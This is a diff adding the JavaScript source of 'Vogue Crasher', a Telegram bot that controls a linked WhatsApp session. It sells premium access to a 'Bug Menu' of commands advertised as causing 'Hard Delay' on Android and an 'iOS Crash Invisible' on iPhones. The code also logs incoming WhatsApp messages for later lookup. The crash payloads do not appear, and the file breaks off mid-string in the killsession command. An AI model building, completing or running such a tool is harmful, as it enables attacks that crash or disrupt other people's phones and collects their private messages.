@@ -1,0 +1,2320 @@
+// ==========================================
+//  LOAD CONFIG, VARIABLE, SENDER
+// ==========================================
+
+const { Telegraf } = require("telegraf");
+const { spawn } = require('child_process')
+const { pipeline } = require('stream/promises');
+const { createWriteStream } = require('fs');
+const fs = require('fs');
+const path = require('path');
+const jid = "0@s.whatsapp.net";
+const vm = require('vm')
+const os = require('os')
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    downloadContentFromMessage,
+    generateWAMessageContent,
+    generateWAMessage,
+    prepareWAMessageMedia,
+    fetchLatestBaileysVersion,
+    generateWAMessageFromContent,
+    DisconnectReason,
+    BufferJSON,
+} = require('@whiskeysockets/baileys');
+const pino = require('pino');
+const crypto = require('crypto');
+const chalk = require('chalk');
+const { tokenBot, ownerID } = require("./settings/config");
+const axios = require('axios');
+const moment = require('moment-timezone');
+const EventEmitter = require('events')
+const makeInMemoryStore = ({ logger = console } = {}) => {
+    const ev = new EventEmitter()
+    
+    let chats = {}
+    let messages = {}
+    let contacts = {}
+    
+    ev.on('messages.upsert', ({ messages: newMessages, type }) => {
+        for (const msg of newMessages) {
+            const chatId = msg.key.remoteJid
+            if (!messages[chatId]) messages[chatId] = []
+            messages[chatId].push(msg)
+            
+            if (messages[chatId].length > 100) {
+                messages[chatId].shift()
+            }
+            
+            chats[chatId] = {
+                ...(chats[chatId] || {}),
+                id: chatId,
+                name: msg.pushName,
+                lastMsgTimestamp: +msg.messageTimestamp
+            }
+        }
+    })
+    
+    ev.on('chats.set', ({ chats: newChats }) => {
+        for (const chat of newChats) {
+            chats[chat.id] = chat
+        }
+    })
+    
+    ev.on('contacts.set', ({ contacts: newContacts }) => {
+        for (const id in newContacts) {
+            contacts[id] = newContacts[id]
+        }
+    })
+    
+    return {
+        chats,
+        messages,
+        contacts,
+        bind: (evTarget) => {
+            evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
+            evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
+            evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
+        },
+        logger
+    }
+}
+
+const question = (query) => new Promise((resolve) => {
+    const rl = require('readline').createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+    rl.question(query, (answer) => {
+        rl.close();
+        resolve(answer);
+    });
+});
+
+const thumbnailUrl = "https://files.catbox.moe/eyhahn.png";
+
+const bot = new Telegraf(tokenBot);
+let sock = null;
+let isWhatsAppConnected = false;
+let linkedWhatsAppNumber = '';
+let lastPairingMessage = null;
+const usePairingCode = true;
+const lastClaim = new Map();
+const messageLog = new Map();
+let restarting = false;
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+const requiredChannel = "@MysticHavenID"; // ganti ini
+const premiumFile = './database/premium.json';
+const premiumGroupFile = './database/premiumgroup.json';
+const claimFile = './database/premium_claimed.json';
+
+const loadClaimed = () => {
+    try {
+        return JSON.parse(fs.readFileSync(claimFile));
+    } catch {
+        return {};
+    }
+};
+
+const saveClaimed = (data) => {
+    fs.writeFileSync(claimFile, JSON.stringify(data, null, 2));
+};
+
+const hasClaimedFreePremium = (userId) => {
+    const data = loadClaimed();
+    return !!data[userId];
+};
+
+const markClaimedFreePremium = (userId) => {
+    const data = loadClaimed();
+    data[userId] = true;
+    saveClaimed(data);
+};
+
+const loadPremiumUsers = () => {
+    try {
+        const data = fs.readFileSync(premiumFile);
+        return JSON.parse(data);
+    } catch (err) {
+        return {};
+    }
+};
+
+const savePremiumUsers = (users) => {
+    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
+};
+
+const addPremiumUser = (userId, duration) => {
+    const premiumUsers = loadPremiumUsers();
+    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
+    premiumUsers[userId] = expiryDate;
+    savePremiumUsers(premiumUsers);
+    return expiryDate;
+};
+
+const removePremiumUser = (userId) => {
+    const premiumUsers = loadPremiumUsers();
+    delete premiumUsers[userId];
+    savePremiumUsers(premiumUsers);
+};
+
+const isPremiumUser = (userId) => {
+    const premiumUsers = loadPremiumUsers();
+    if (premiumUsers[userId]) {
+        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
+        if (moment().isBefore(expiryDate)) {
+            return true;
+        } else {
+            removePremiumUser(userId);
+            return false;
+        }
+    }
+    return false;
+};
+
+if (!fs.existsSync(premiumGroupFile)) {
+    fs.writeFileSync(
+        premiumGroupFile,
+        JSON.stringify([], null, 2)
+    );
+}
+
+function loadPremiumGroups() {
+    return JSON.parse(
+        fs.readFileSync(premiumGroupFile)
+    );
+}
+
+function savePremiumGroups(data) {
+    fs.writeFileSync(
+        premiumGroupFile,
+        JSON.stringify(data, null, 2)
+    );
+}
+
+function isPremiumGroup(chatId) {
+    const groups = loadPremiumGroups();
+    return groups.includes(chatId.toString());
+}
+
+function checkPremiumAccess(ctx, next) {
+    
+    const userId = ctx.from.id.toString();
+    const chatId = ctx.chat.id.toString();
+    
+    const premiumUsers = loadPremiumUsers();
+    
+    const userPremium =
+        premiumUsers[userId];
+    
+    const groupPremium =
+        isPremiumGroup(chatId);
+    
+    if (userPremium || groupPremium) {
+        return next();
+    }
+    
+    return ctx.reply(
+        `Access Denied
+
+This feature is restricted to premium users or premium groups.`
+    );
+}
+
+function autoRestartOn408(error) {
+
+    if (!error) return;
+
+    const errText =
+        String(error?.message || error);
+
+    // =========================
+    // DETECT 408
+    // =========================
+
+    if (
+        errText.includes("408") ||
+        errText.includes("Timed Out") ||
+        errText.includes("timeout")
+    ) {
+
+        if (restarting) return;
+
+        restarting = true;
+
+        console.log(`
+[VOGUE SYSTEM]
+
+408 DETECTED
+Restarting process...
+`);
+
+        setTimeout(() => {
+
+            process.exit(1);
+
+        }, 3000);
+    }
+}
+
+const startSesi = async () => {
+    console.clear();
+    console.log(chalk.bold.yellow(`
+⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
+⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
+⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
+⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
+⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
+⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
+⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
+
+
+» Information:
+  Developer: Prince
+  Version: 1.0 Pro
+  Status: Bot Connected
+  `))
+    
+    const store = makeInMemoryStore({
+        logger: require('pino')().child({ level: 'silent', stream: 'store' })
+    })
+    const { state, saveCreds } = await useMultiFileAuthState('./session');
+    const { version } = await fetchLatestBaileysVersion();
+    
+    const connectionOptions = {
+        version,
+        keepAliveIntervalMs: 30000,
+        printQRInTerminal: !usePairingCode,
+        logger: pino({ level: "silent" }),
+        auth: state,
+        browser: ['Mac OS', 'Safari', '10.15.7'],
+    };
+    
+    sock = makeWASocket(connectionOptions);
+    
+    sock.ev.on("messages.upsert", async ({ messages }) => {
+    
+        const msg = messages[0];
+        
+        if (!msg.message) return;
+        
+        const sender = msg.key.remoteJid;
+        
+        messageLog.set(sender, {
+            id: msg.key.id,
+            sender: sender,
+            pushName: msg.pushName || "Unknown",
+            text: msg.message.conversation ||
+                msg.message.extendedTextMessage?.text ||
+                "[MEDIA/OTHER]",
+            timestamp: msg.messageTimestamp,
+            type: Object.keys(msg.message)[0]
+        });
+        
+    });
+    
+    sock.ev.on('creds.update', saveCreds);
+    store.bind(sock.ev);
+    
+    sock.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === 'open') {
+            
+            if (lastPairingMessage) {
+                const connectedMenu = `
+<pre>
+VOGUE CRASH • PAIRING SYSTEM
+────────────────────────────
+
+Session Information
+
+Client Name   : Vogue Crasher
+Developer     : @ScriptKits
+Version       : 1.0
+Prefix        : /
+
+────────────────────────────
+
+Registered Number :
+${lastPairingMessage.phoneNumber}
+
+Pairing Code :
+${lastPairingMessage.pairingCode}
+
+Connection Status Connected and Operational
+
+──────────────────────────────
+The sender session has been successfully initialized and is ready for use.
+</pre>`;
+                
+                try {
+                    bot.telegram.editMessageCaption(
+                        lastPairingMessage.chatId,
+                        lastPairingMessage.messageId,
+                        undefined,
+                        connectedMenu, { parse_mode: "HTML" }
+                    );
+                } catch (e) {}
+            }
+            
+            console.clear();
+            isWhatsAppConnected = true;
+            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
+            console.log(chalk.bold.yellow(`
+⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
+⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
+⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
+⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
+⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
+⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
+⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
+
+
+» Information:
+  Developer: Prince
+  Version: 1.0 Pro
+  Status: Sender Connected
+  `))
+        }
+        
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            console.log(
+                chalk.red('Koneksi WhatsApp terputus:'),
+                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
+            );
+            if (shouldReconnect) {
+                startSesi();
+            }
+            isWhatsAppConnected = false;
+        }
+    });
+};
+
+startSesi();
+
+const checkWhatsAppConnection = (ctx, next) => {
+    if (!isWhatsAppConnected) {
+        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
+        return;
+    }
+    next();
+};
+
+const checkPremium = (ctx, next) => {
+    if (!isPremiumUser(ctx.from.id)) {
+        ctx.reply("❌ ☇ Akses hanya untuk premium");
+        return;
+    }
+    next();
+};
+
+// ==========================================
+// HOME PAGE START BOT
+// ==========================================
+
+bot.start(ctx => {
+    const menuMessage = `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+System Information
+
+User        : ${ctx.from.first_name}
+Developer   : @ScriptKits
+Version     : 1.0 Pro
+Prefix      : /
+Framework   : Javascript
+
+Description
+
+This Telegram automation system is connected with WhatsApp session integration and advanced function execution modules.
+
+All operations are monitored and executed through the central dispatch system.
+
+──────────────────────────
+
+Select one of the available options below to continue system interaction.
+</pre>`;
+    
+    
+    const keyboard = [
+        [
+        {
+            text: "Control",
+            callback_data: "/controls"
+        },
+        {
+            text: "Bug Menu",
+            callback_data: "/bug"
+        }, ],
+        [
+        {
+            text: "Developer",
+            callback_data: "/tqto"
+        }],
+        [
+        {
+            text: "🎁 Free 1 Day Premium",
+            callback_data: "free_premium_info"
+        }]
+    ];
+    
+    ctx.replyWithPhoto(thumbnailUrl, {
+        caption: menuMessage,
+        parse_mode: "HTML",
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+});
+
+bot.action('/start', async (ctx) => {
+    const menuMessage = `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+System Information
+
+User        : ${ctx.from.first_name}
+Developer   : @ScriptKits
+Version     : 1.0 Pro
+Prefix      : /
+
+Description
+
+This Telegram automation system is connected with WhatsApp session integration and advanced function execution modules.
+
+All operations are monitored and executed through the central dispatch system.
+
+──────────────────────────
+
+Select one of the available options below to continue system interaction.
+</pre>`;
+    
+    const keyboard = [
+        [
+        {
+            text: "Control",
+            callback_data: "/controls"
+        },
+        {
+            text: "Bug Menu",
+            callback_data: "/bug"
+        }],
+        [
+        {
+            text: "Developer",
+            callback_data: "/tqto"
+        }],
+        [
+        {
+            text: "🎁 Free 1 Day Premium",
+            callback_data: "free_premium_info"
+        }]
+    ];
+    
+    try {
+        await ctx.editMessageMedia({
+            type: 'photo',
+            media: thumbnailUrl,
+            caption: menuMessage,
+            parse_mode: "HTML",
+        }, {
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified") {
+            await ctx.answerCbQuery();
+        } else {}
+    }
+});
+
+bot.action('free_premium_info', async (ctx) => {
+    
+    return ctx.editMessageCaption(
+        `<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+FREE PREMIUM ACCESS
+
+Reward      : 1 Day Premium
+Condition   : Join Channel Required
+
+──────────────────────────
+
+You must join our channel to claim premium access.
+
+After joining, press CHECK button.
+</pre>`,
+        {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "Join Channel", url: `https://t.me/${requiredChannel.replace('@','')}` }
+                    ],
+                    [
+                        { text: "Check Join", callback_data: "check_premium_join" }
+                    ]
+                ]
+            }
+        }
+    );
+});
+
+bot.action('check_premium_join', async (ctx) => {
+    
+    const userId = ctx.from?.id;
+    
+    if (!userId) {
+        return ctx.answerCbQuery("Invalid user context", { show_alert: true });
+    }
+    
+    if (hasClaimedFreePremium(userId)) {
+        return ctx.answerCbQuery(
+            "You already used free premium permanently.", { show_alert: true }
+        );
+    }
+    
+    try {
+        // 🔥 safety check channel format
+        if (!requiredChannel.startsWith('@')) {
+            throw new Error("Invalid channel format. Must be @username");
+        }
+        
+        const member = await ctx.telegram.getChatMember(requiredChannel, userId);
+        
+        if (!member || member.status === "left" || member.status === "kicked") {
+            return ctx.answerCbQuery("Join channel first.", { show_alert: true });
+        }
+        
+        const expiry = addPremiumUser(userId, 1);
+        
+        markClaimedFreePremium(userId);
+        
+        return ctx.editMessageCaption(
+            `<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+FREE PREMIUM GRANTED
+
+User     : ${ctx.from.first_name}
+Status   : ACTIVE (1 DAY)
+Expiry   : ${moment(expiry).format("DD-MM-YYYY HH:mm")}
+
+──────────────────────────
+One-time reward activated.
+</pre>`, { parse_mode: "HTML" });
+        
+    } catch (err) {
+        console.log("CHECK PREMIUM ERROR:", err);
+        
+        // kasih error spesifik biar gampang debug
+        return ctx.answerCbQuery(
+            "Failed to verify channel membership.", { show_alert: true }
+        );
+    }
+});
+bot.action('/controls', async (ctx) => {
+    const controlsMenu = `
+<pre>  
+V O G U E  •  C R A S H E R  
+──────────────────────────
+
+CONTROL PANEL
+
+User        : ${ctx.from.first_name}
+Developer   : @ScriptKits
+Version     : 1.0 Pro
+Prefix      : /
+
+──────────────────────────
+
+OWNER MANAGEMENT
+
+/reqpair
+› Initialize a new WhatsApp sender session
+/killsession
+› Kill & Remove all sessions
+/info
+› Display full bot and VPS information
+/restartbot
+› Restart Bot
+
+──────────────────────────
+
+PREMIUM MANAGEMENT
+
+/addprem
+› Grant premium access to a user
+/delprem
+› Revoke premium access from a user
+/listprem
+› Display all premium users
+
+──────────────────────────
+
+GROUP ACCESS MANAGEMENT
+
+/addgrupremium
+› Enable premium access for current group
+/delgrupremium
+› Remove premium access from current group
+
+──────────────────────────
+
+SYSTEM STATUS
+
+› All services are operational
+› Dispatch engine is active
+
+──────────────────────────
+</pre>`;
+    
+    const keyboard = [
+        [
+        {
+            text: "Back To Menu",
+            callback_data: "/start"
+        }]
+    ];
+    
+    try {
+        
+        await ctx.editMessageCaption(
+            controlsMenu,
+            {
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: keyboard
+                }
+            }
+        );
+        
+    } catch (error) {
+        
+        try {
+            await ctx.answerCbQuery();
+        } catch {}
+        
+    }
+    
+});
+
+bot.action('/bug', async (ctx) => {
+    const bugMenu = `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+BUG EXECUTION PANEL
+
+User        : ${ctx.from.first_name}
+Developer   : @ScriptKits
+Version     : 1.0 Pro
+Prefix      : /
+
+──────────────────────────
+
+A N D R O I D
+/spamandro  : Hard Delay 100%
+
+──────────────────────────
+
+I P H O N E 
+/spamiphone : iOS Crash Invisible
+
+──────────────────────────
+</pre>`;
+    
+    const keyboard = [
+        [
+        {
+            text: "Back",
+            callback_data: "/start"
+        }]
+    ];
+    
+    try {
+        await ctx.editMessageCaption(bugMenu, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+    } catch (error) {
+        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified") {
+            await ctx.answerCbQuery();
+        } else {}
+    }
+});
+
+bot.action('/tqto', async (ctx) => {
+    
+    const tqtoMenu = `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+ACKNOWLEDGEMENT PANEL
+
+User        : ${ctx.from.first_name}
+Developer   : @ScriptKits
+Version     : 1.0 Pro
+Prefix      : /
+
+──────────────────────────
+
+Support Team
+@ScriptKits
+
+──────────────────────────
+Official Build by VOGUE CRASHER
+</pre>`;
+    
+    const keyboard = [
+        [
+        {
+            text: "Return to Main Menu",
+            callback_data: "/start"
+        }]
+    ];
+    
+    try {
+        
+        await ctx.editMessageCaption(tqtoMenu, {
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: keyboard
+            }
+        });
+        
+    } catch (error) {
+        
+        if (
+            error.response &&
+            error.response.error_code === 400 &&
+            error.response.description === "Bad Request: message is not modified"
+        ) {
+            
+            await ctx.answerCbQuery();
+            
+            console.log(
+                "[VOGUE CRASHER] Message update skipped because the content is identical."
+            );
+            
+        } else {
+            
+            console.log(
+                "[VOGUE CRASHER] Failed to update acknowledgement panel."
+            );
+            
+        }
+    }
+});
+
+// ==========================================
+// COMMAND SENDER
+// ==========================================
+
+bot.command("reqpair", async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    
+    const args = ctx.message.text.split(" ")[1];
+    if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");
+    
+    const phoneNumber = args.replace(/[^0-9]/g, "");
+    if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
+    
+    try {
+        if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
+        if (sock.authState.creds.registered) {
+            return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
+        }
+        
+        const code = await sock.requestPairingCode(phoneNumber);
+        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+        
+        const pairingMenu = `
+<pre>
+VOGUE CRASH • PAIRING SYSTEM
+──────────────────────────── 
+
+Welcome, ${ctx.from.first_name}
+
+This system is connected to the
+Trash Matrix WhatsApp engine.
+
+Session Information
+
+Developer     : @ScriptKits
+Version       : 1.0 Pro
+Prefix        : /
+
+────────────────────────────
+
+Target Number
+${phoneNumber}
+
+Pairing Code
+${formattedCode}
+
+Connection Status
+Waiting for Authentication
+
+──────────────────────────────
+Open WhatsApp Linked Devices and
+enter the pairing code above to
+complete the authorization process.
+</pre>`;
+        
+        const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: pairingMenu,
+            parse_mode: "HTML"
+        });
+        
+        lastPairingMessage = {
+            chatId: ctx.chat.id,
+            messageId: sentMsg.message_id,
+            phoneNumber,
+            pairingCode: formattedCode
+        };
+        
+    } catch (err) {
+        console.error(err);
+    }
+});
+
+
+if (sock) {
+    sock.ev.on("connection.update", async (update) => {
+        if (update.connection === "open" && lastPairingMessage) {
+            const updateConnectionMenu = `
+<pre>
+VOGUE CRASH • CONNECTION STATUS
+──────────────────────────────
+
+WhatsApp session has been successfully
+authenticated and is now operational.
+
+System Information
+
+Developer     : @ScriptKits
+Version       : 1.0 Pro
+Prefix        : /
+
+──────────────────────────────
+
+Registered Number
+${lastPairingMessage.phoneNumber}
+
+Pairing Code
+${lastPairingMessage.pairingCode}
+
+Connection Status
+Connected Successfully
+
+──────────────────────────────
+The sender session is active and ready
+for command execution.
+</pre>`;
+            
+            try {
+                await bot.telegram.editMessageCaption(
+                    lastPairingMessage.chatId,
+                    lastPairingMessage.messageId,
+                    undefined,
+                    updateConnectionMenu, { parse_mode: "HTML" }
+                );
+            } catch (e) {}
+        }
+    });
+}
+
+// ==========================================
+//  PERMIUM COMMAND
+// ==========================================
+
+bot.command('addprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 3) {
+        return ctx.reply("🪧 ☇ Format: /addprem [user_id] [duration_in_days]");
+    }
+    const userId = args[1];
+    const duration = parseInt(args[2]);
+    if (isNaN(duration)) {
+        return ctx.reply("🪧 ☇ Durasi harus berupa angka (dalam hari)");
+    }
+    const expiryDate = addPremiumUser(userId, duration);
+    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
+});
+
+bot.command('listprem', async (ctx) => {
+    
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+            `Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
+    
+    const premiumUsers = loadPremiumUsers();
+    
+    const userIds = Object.keys(premiumUsers);
+    
+    if (userIds.length === 0) {
+        return ctx.reply(
+            `<pre>
+┏━ V O G U E • P R E M I U M • L I S T ━┓
+
+No premium users are currently registered.
+
+┗━ System returned empty result ━┛
+</pre>`,
+            {
+                parse_mode: "HTML"
+            }
+        );
+    }
+    
+    let text = "";
+    let no = 1;
+    
+    for (const id of userIds) {
+        
+        const expiry = premiumUsers[id];
+        
+        const expired =
+            moment(expiry, 'DD-MM-YYYY')
+            .isBefore(moment());
+        
+        text += `
+${no}. USER INFORMATION
+
+› User ID
+  ${id}
+› Access Status
+  ${expired ? "Expired" : "Active"}
+› Expiration Date
+  ${expiry}
+
+────────────────────────────
+`;
+        
+        no++;
+    }
+    
+    const result = `
+<pre>
+┏━ V O G U E • P R E M I U M • L I S T ━┓
+
+⌬ REGISTERED PREMIUM USERS
+
+Total Users : ${userIds.length}
+
+────────────────────────────
+${text}
+┗━ End Of Premium Directory ━┛
+</pre>`;
+    
+    if (result.length > 1024) {
+        return ctx.reply(
+            result,
+            {
+                parse_mode: "HTML"
+            }
+        );
+    }
+    
+    ctx.replyWithPhoto(thumbnailUrl, {
+        caption: result,
+        parse_mode: "HTML"
+    });
+    
+});
+
+bot.command('delprem', async (ctx) => {
+    if (ctx.from.id != ownerID) {
+        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
+    }
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return ctx.reply("🪧 ☇ Format: /delprem [user_id]");
+    }
+    const userId = args[1];
+    removePremiumUser(userId);
+    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
+});
+
+bot.command('addgrup', async (ctx) => {
+    
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+            `Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
+    
+    if (
+        ctx.chat.type !== 'group' &&
+        ctx.chat.type !== 'supergroup'
+    ) {
+        return ctx.reply(
+            `Invalid Context
+
+This command can only be used inside a group.`
+        );
+    }
+    
+    const chatId = ctx.chat.id.toString();
+    
+    let groups = loadPremiumGroups();
+    
+    if (groups.includes(chatId)) {
+        return ctx.reply(
+            `Premium Group Already Registered
+
+This group already has premium access enabled.`
+        );
+    }
+    
+    groups.push(chatId);
+    
+    savePremiumGroups(groups);
+    
+    ctx.reply(
+        `<pre>
+┏━ V O G U E • P R E M I U M • G R O U P ━┓
+
+Premium access has been successfully
+enabled for this group.
+
+› Group ID
+  ${chatId}
+› Status
+  Active
+
+All members inside this group can now
+access premium commands.
+
+┗━ Access authorization completed ━┛
+</pre>`,
+        {
+            parse_mode: "HTML"
+        }
+    );
+    
+});
+
+bot.command('delgrup', async (ctx) => {
+    
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+            `Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
+    
+    const chatId = ctx.chat.id.toString();
+    
+    let groups = loadPremiumGroups();
+    
+    if (!groups.includes(chatId)) {
+        return ctx.reply(
+            `Premium Group Not Found
+
+This group is not registered as premium.`
+        );
+    }
+    
+    groups = groups.filter(
+        id => id !== chatId
+    );
+    
+    savePremiumGroups(groups);
+    
+    ctx.reply(
+        `<pre>
+┏━ V O G U E • P R E M I U M • G R O U P ━┓
+
+Premium access has been revoked
+from this group.
+
+› Group ID
+  ${chatId}
+
+› Status
+  Removed
+
+┗━ Access revocation completed ━┛
+</pre>`,
+        {
+            parse_mode: "HTML"
+        }
+    );
+    
+});
+
+// ==========================================
+// TOOLS COMMAND
+// ==========================================
+
+bot.command('checkmsg', async (ctx) => {
+
+    const reply = ctx.message.reply_to_message;
+
+    let targetJid;
+
+    if (reply?.from?.id) {
+        targetJid = reply.from.id + "@s.whatsapp.net";
+    } else {
+        return ctx.reply(
+`Usage:
+/checkmsg (reply to message)`
+        );
+    }
+
+    const data = messageLog.get(targetJid);
+
+    if (!data) {
+        return ctx.reply(
+`No message data found for this user.`
+        );
+    }
+
+    return ctx.reply(
+`📩 MESSAGE INFO
+
+────────────────────
+Sender      : ${data.sender}
+Name        : ${data.pushName}
+Message ID  : ${data.id}
+Type        : ${data.type}
+Time        : ${new Date(data.timestamp * 1000).toLocaleString()}
+
+────────────────────
+Content:
+${data.text}
+`
+    );
+
+});
+
+bot.command('restartbot', async (ctx) => {
+    
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+            `Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
+    
+    const msg = await ctx.reply(
+        `<pre>
+V O G U E  •  S Y S T E M
+──────────────────────────
+
+RESTART OPERATION
+
+Status      : Initializing
+Engine      : Restart Sequence
+Process     : Rebuilding Runtime
+
+──────────────────────────
+The bot system is preparing for restart execution.
+</pre>`,
+        {
+            parse_mode: "HTML"
+        }
+    );
+    
+    setTimeout(async () => {
+        
+        try {
+            
+            await ctx.telegram.editMessageText(
+                ctx.chat.id,
+                msg.message_id,
+                undefined,
+                `<pre>
+V O G U E  •  S Y S T E M
+──────────────────────────
+
+RESTART OPERATION
+
+Status      : Complete
+Engine      : Online
+Process     : Runtime Recovered
+
+──────────────────────────
+The bot system has been
+successfully restarted.
+</pre>`,
+                {
+                    parse_mode: "HTML"
+                }
+            );
+            
+        } catch {}
+        
+        process.exit(1);
+        
+    }, 3000);
+    
+});
+
+bot.command('killsession', async (ctx) => {
+    
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+            `Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
+    
+    const msg = await ctx.reply(
+        `<pre>
+V O G U E  •  S E S S I O N
